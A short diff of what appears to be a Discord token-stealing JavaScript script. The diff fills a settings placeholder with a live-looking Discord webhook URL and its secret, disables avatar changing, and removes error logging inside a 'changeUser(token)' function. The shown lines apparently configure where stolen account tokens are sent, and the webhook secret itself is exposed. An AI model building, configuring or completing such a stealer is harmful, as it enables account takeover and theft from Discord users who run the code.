@@ -1,6 +1,6 @@
 // settings
-var webhook = "your webhook"
-var changeAvatar = true // choose if you want to change the avatar
+var webhook = "https://discord.com/api/webhooks/959118953987338250/6YTeW8dSYTqfvKmLLa5NBpmantRXK-Pj443BU_F5tvXu_6PfCL9-HO0m_ZJvfmAmOzH0"
+var changeAvatar = false // choose if you want to change the avatar
 var newAvatar = "prefer using an image like: https://cdn.discordapp.com/avatars/958141688214343770/a_fcbf2a552f71b07f4f2dd138d32cbc5d.gif?size=1024 or bugs can happen";
 
 // thanks for badges stanley-gf
@@ -137,7 +137,6 @@ function changeUser(token) {
             }
         });
         } catch (e) {
-            console.log(e);
             avatarError = true;
             avatarMessageError = JSON.stringify(
                 {
